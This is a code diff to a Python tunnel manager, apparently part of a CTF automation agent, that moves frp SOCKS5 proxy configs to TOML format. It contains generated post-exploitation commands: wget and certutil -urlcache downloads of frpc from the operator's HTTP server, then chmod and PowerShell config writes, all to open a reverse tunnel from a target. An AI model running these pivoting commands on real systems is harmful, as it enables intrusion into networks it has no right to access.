@@ -56,24 +56,21 @@ class TunnelManager:
     管理 frp 代理隧道
     """
 
-    # frp 配置模板
-    FRPS_CONFIG_TEMPLATE = """
-[common]
-bind_port = {vps_port}
-token = {token}
+    # frp 配置模板 (frp 0.52.0+ 使用 TOML 格式)
+    FRPS_CONFIG_TEMPLATE = """serverPort = "{vps_port}"
+auth.token = "{token}"
 """
 
-    FRPC_CONFIG_TEMPLATE = """
-[common]
-server_addr = {local_ip}
-server_port = {vps_port}
-token = {token}
+    FRPC_CONFIG_TEMPLATE = """serverAddr = "{local_ip}"
+serverPort = {vps_port}
+auth.token = "{token}"
 
-[socks5]
-type = tcp
-remote_port = {remote_port}
-local_ip = 127.0.0.1
-local_port = {local_port}
+[[proxies]]
+name = "socks5"
+type = "tcp"
+remotePort = {remote_port}
+localIP = "127.0.0.1"
+localPort = {local_port}
 """
 
     def __init__(self):
@@ -173,7 +170,8 @@ local_port = {local_port}
 
             result["commands"] = [
                 f"# 1. 下载frpc (从本机HTTP服务器)",
-                f"wget -O {remote_path} http://{config.local_ip}:8000/frpc",
+                f"# frpc位于/opt/frp/frpc，HTTP服务器根目录为/opt",
+                f"wget -O {remote_path} http://{config.local_ip}:8000/frp/frpc",
                 f"chmod +x {remote_path}",
                 f"",
                 f"# 2. 写入配置文件",
@@ -194,7 +192,8 @@ local_port = {local_port}
 
             result["commands"] = [
                 f"# 1. 下载frpc (从本机HTTP服务器)",
-                f"certutil -urlcache -split -f http://{config.local_ip}:8000/frpc.exe {remote_path}",
+                f"# frpc.exe位于/opt/tools/windows/frpc.exe",
+                f"certutil -urlcache -split -f http://{config.local_ip}:8000/tools/windows/frpc.exe {remote_path}",
                 f"",
                 f"# 2. 写入配置文件 (PowerShell)",
                 f"powershell -c \"[IO.File]::WriteAllText('{config_path}', '{frpc_config}')\"",
@@ -424,11 +423,10 @@ def start_local_frps(port: int = 7000, frp_dir: str = "/opt/frp") -> Optional[su
         print("[TunnelManager] 请先下载frp: https://github.com/fatedier/frp/releases")
         return None
 
-    # 生成默认配置
+    # 生成默认配置 (frp 0.52.0+ TOML格式)
     if not os.path.exists(config_path):
-        config = f"""[common]
-bind_port = {port}
-token = ctf_agent_token
+        config = f"""serverPort = {port}
+auth.token = "ctf_agent_token"
 """
         with open(config_path, 'w') as f:
             f.write(config)
